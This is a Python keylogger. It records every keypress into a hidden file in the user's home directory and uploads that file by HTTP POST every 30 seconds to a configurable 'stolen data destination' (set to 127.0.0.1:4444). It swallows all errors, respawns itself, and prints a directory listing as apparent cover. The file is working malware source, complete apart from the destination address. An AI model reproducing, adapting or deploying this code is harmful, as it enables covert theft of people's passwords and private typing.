import os, keyboard, requests, \
    sched, time, threading, \
    subprocess, sys

class Send:
    
    @staticmethod
    def _send(file:str) -> None:

        SDD_IP = "127.0.0.1" # stolenDataDestination_IP
        SDD_PORT = 4444 # stolenDataDestination_PORT

        try:
            response = requests.post(
                url=f"http://{SDD_IP}:{SDD_PORT}",
                files={'file': file}
            )
        except Exception:pass

    @staticmethod
    def _schedule(scheduler)  -> None:

        try: 
            # 5 minutes = 5 * 60 = 300 seconds
            scheduler.enter(30, 1, Send._schedule, (scheduler,))
            with open(Save.getPath(), 'rb') as fileSend:
                Send._send(file=fileSend)
        except:pass

class Save:

    @staticmethod
    def getPath() -> str:
        
        try:return str(os.path.join(os.path.expanduser('~'), ".keylog"))
        except:return "/tmp/.keylog"
    
    @staticmethod
    def _save(key:str) -> None:

        with open(Save.getPath(), 'a') as hiddenFile:
            hiddenFile.write(key + '\n')
        hiddenFile.close()

class Typed:

    @staticmethod
    def _onType(event) -> None:Save._save(event.name)
    
    @staticmethod
    def run() -> None:keyboard.on_press(Typed._onType)

class Boot:

    @staticmethod
    def _doScheduler():

        scheduler = sched.scheduler(time.time, time.sleep)
        scheduler.enter(0, 1, Send._schedule, (scheduler,))
        scheduler.run()

    @staticmethod
    def _doLogger():

        try:Typed.run();keyboard.wait()
        except KeyboardInterrupt:pass

    def __init__(self) -> None:
        
        sendThread = threading.Thread(target=Boot._doScheduler)
        loggerThread = threading.Thread(target=Boot._doLogger)
        sendThread.start();loggerThread.start()
        sendThread.join();loggerThread.join()

if __name__ == '__main__':
    try:
        subprocess.Popen([sys.executable, sys.argv[0]])
        try:
            print(f"{subprocess.check_output(['ls']).decode('utf-8')}")
        except:pass
        finally:Boot()
    except:pass